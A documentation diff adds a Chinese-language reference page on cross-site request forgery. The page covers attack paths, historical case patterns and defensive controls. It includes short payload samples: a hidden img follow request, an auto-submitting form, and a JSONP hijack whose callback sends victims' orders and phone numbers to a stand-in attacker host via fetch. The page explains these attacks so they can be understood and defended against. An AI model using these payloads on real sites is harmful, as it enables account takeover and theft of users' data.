@@ -1,0 +1,109 @@
+---
+slug: /csrf
+title: CSRF 跨站请求伪造
+icon: at-sign-icon
+sidebar_position: 11
+---
+
+**CSRF 利用的是服务端对"请求来自已认证用户"的过度信任：只要浏览器携带了用户的 Cookie，服务端就认为请求合法，而浏览器在访问页面或加载资源时会自动附带对应域的 Cookie——攻击者不需要知道用户的 Cookie，只需要让用户的浏览器发出一个预定格式的请求。** 这与 XSS"在页面内执行 JS"的路径截然不同：CSRF 不需要注入代码，只需要触发一次 HTTP 请求。
+
+## 成立前提
+
+目标操作（修改账号信息、转账、发帖、加关注等）可通过单次 HTTP 请求完成；请求未携带服务端下发的随机 Token；服务端未校验 `Referer` 来源（或校验可绕过）；用户在目标站点保持登录状态时访问了攻击者控制的页面。
+
+## 利用链路
+
+### GET 请求副作用（最简单）
+
+状态变更操作使用 GET 请求，攻击者将 URL 嵌入 `<img>` 标签，受害者加载包含该图片的任何页面时自动触发：
+
+```html
+<img src="https://target.com/follow?uid=attacker" width="0" height="0">
+```
+
+关注、点赞、投票、刷粉丝均属此类。
+
+### POST 请求伪造
+
+表单提交无 Token，攻击者构造自动提交的 HTML 表单：
+
+```html
+<form id="f" action="https://target.com/api/address/add" method="POST">
+  <input type="hidden" name="name" value="攻击者">
+  <input type="hidden" name="phone" value="<attacker_phone>">
+</form>
+<script>document.getElementById('f').submit()</script>
+```
+
+受害者访问托管此 HTML 的页面时，表单自动以受害者身份提交。
+
+### CMS 后台 CSRF Getshell
+
+后台文件写入/模板修改接口无 CSRF 保护，攻击者发布含恶意 payload 的评论或内容，内含自动提交表单，等管理员查看时触发向 web 目录写入 webshell。
+
+### OAuth `redirect_uri` CSRF
+
+OAuth 2.0 流程中服务端未下发 `state` 参数（或客户端未校验），攻击者构造指向恶意站的授权请求，截获授权码后与受害者账号绑定，实现账号劫持：
+
+```
+攻击者: 发起 OAuth 授权请求 → 截断获得 code
+受害者: 访问攻击者构造的链接 → 用自己账号完成授权
+结果:  受害者账号绑定到攻击者的第三方账号
+```
+
+### JSON 劫持（CSRF 变种）
+
+JSONP 接口返回含用户数据的回调，攻击者页面引入此脚本，回调函数中的数据进入攻击者控制的作用域：
+
+```html
+<script>
+function callback(data) {
+  // data 包含受害者的订单、地址、手机号
+  fetch('//attacker/?d=' + JSON.stringify(data));
+}
+</script>
+<script src="https://target.com/api/orders?callback=callback"></script>
+```
+
+### CSRF 蠕虫
+
+社交/内容平台的发帖/转发接口无 Token，攻击者将 CSRF payload 嵌入帖子正文，访问帖子的用户自动执行转发，转发后的内容再次触发下一批用户，形成蠕虫传播链。`Referer` 校验可通过 HTTPS→HTTP 跳转绕过（Referer 头在协议降级时不携带）。
+
+## 历史样本
+
+**微博/社区关注接口**：关注/转发使用无认证的 GET 请求，将 URL 嵌入图片 src，插入到任意可展示图片的页面（签名、头像、日志）即可批量刷粉丝，触发蠕虫传播。
+
+**电商收货地址/订单操作**：修改收货地址的 POST 接口无 Token，结合站内 XSS 或诱导点击，可将受害者的收货地址改为攻击者地址，在受害者下单后截获货物。
+
+**后台 Getshell**：CMS 后台的"修改模板"/"执行 SQL"功能无 CSRF 保护，攻击者在留言板或私信中植入自动提交表单，管理员查看时触发写入 webshell。
+
+**OAuth 账号劫持**：第三方登录绑定接口未携带 `state` 参数，攻击者构造绑定请求，受害者点击后将自己账号与攻击者的第三方账号绑定，攻击者可直接登录受害者账号。
+
+**Referer 绕过**：部分站点仅校验 Referer 是否包含自身域名（而非精确匹配），构造 `evil.com?q=target.com` 即可通过校验；或在 HTTPS 站点发起请求跳转到 HTTP，Referer 不携带。
+
+**支付/积分强制消耗**：支付密码设置、积分兑换、虚拟货币消费等接口无 Token，攻击者构造自动提交表单，受害者访问时以其身份完成消费或绑定支付密码；对首次设置支付密码的用户危害尤其直接——若接口不要求旧密码，攻击者可直接设置任意支付密码后接管账户资产。
+
+**强制绑定手机/邮箱**：账户绑定类接口（绑定手机号、绑定邮箱、绑定第三方账号）以 GET 或无 Token 的 POST 实现，攻击者将目标参数嵌入链接或图片，受害者打开后即完成绑定——绑定完成后攻击者可通过绑定的凭据找回密码或直接登录。
+
+**Token 经旁路接口泄露后二次利用**：部分系统将 CSRF Token 附在后台 URL 的 query 参数中（如 `pc_hash=xxx`），当攻击者在后台可控区域（审核队列中的图片链接、友情链接图片地址）嵌入指向自己服务器的图片 URL 时，管理员浏览页面触发图片请求，Token 随 `Referer` 头发送至攻击者服务器；攻击者获得 Token 后即可构造合法的后台操作请求。另一种情形是错误响应直接返回新 Token 字段——前端用于刷新 Token，但攻击者可先请求该错误接口获取 Token，再携带 Token 完成真实操作，使 Token 防御完全失效。
+
+**CSRF 删除他人内容**：删除评论、文章、简历、收货地址等操作使用 GET 请求且无 Token，攻击者将删除链接嵌入图片 src，受害者加载页面时自动以自身身份触发删除；因 `address_id`、`comment_id` 等资源 ID 为自增整数，攻击者可遍历批量删除任意用户的数据。
+
+**强制退出（Logout CSRF）**：退出登录接口为无保护的 GET 请求，攻击者在论坛帖子或图片中嵌入退出链接，管理员或普通用户浏览帖子时被静默退出；当退出配合持续自动刷新时，受害者无法维持登录状态，形成持续性拒绝服务。
+
+**multipart/form-data 文件上传 CSRF**：头像、附件等上传接口以 `multipart/form-data` 编码提交，开发者误以为浏览器无法跨域构造此类表单而省略 Token 校验。攻击者通过 HTML `<form enctype="multipart/form-data">` 即可跨站触发，不仅能替换受害者头像，还可借助文件写入路径在服务端落地 webshell。
+
+**多步骤流程仅保护第一步**：密码修改、邮箱绑定等操作通常拆成"验证旧凭据"与"提交新值"两步，第一步需要旧密码或短信验证码，第二步却未携带 Token。攻击者绕过第一步直接构造第二步请求即可完成修改——若参数中 `old_password` 字段缺失时服务端仍接受请求，则连"知道旧密码"的前提都不需要。
+
+**Flash/SWF 绕过 Referer 与读取 Token**：允许嵌入用户上传 SWF 的社区，若未设置 `allowNetworking` 限制，Flash 可发起任意跨域 POST 请求，Referer 不受同源策略约束，CSRF 防御形同虚设。另一变种是站点 `crossdomain.xml` 配置 `allow-access-from domain="*"`，任意域下的 Flash 均可读取目标站的 CSRF Token（如 formhash），进而携带合法 Token 完成后续操作，使 Token 机制完全失效。
+
+**邮箱/云存储自动转发规则 CSRF**：邮件系统和云存储的"自动转发"、"绑定推送邮箱"等设置接口无 Token，攻击者将 CSRF payload 嵌入一封 HTML 邮件，受害者打开邮件时，浏览器自动触发请求，为攻击者设置全量邮件转发规则或绑定攻击者邮箱；此后受害者的所有来信和通知实时抄送至攻击者，影响持续且难以察觉。
+
+## 防御控制点
+
+- **CSRF Token**：服务端为每个会话生成不可预测的 Token，状态变更请求必须携带 Token，服务端验证后消费
+- **`SameSite` Cookie 属性**：设为 `Strict` 或 `Lax`，第三方站点触发的请求不携带 Cookie，从根本上阻断跨站请求
+- **`Origin`/`Referer` 验证**：验证来源头是否属于允许域，并处理空 Referer（拒绝）
+- **状态变更操作避免 GET**：关注、删除、支付等操作统一使用 POST，消除图片/链接触发的风险
+- **OAuth 强制 `state` 参数**：授权请求携带随机 `state`，回调时验证，防止授权码 CSRF
+- **JSON 接口替代 JSONP**：新接口使用 JSON + CORS 白名单，停用 JSONP 接口
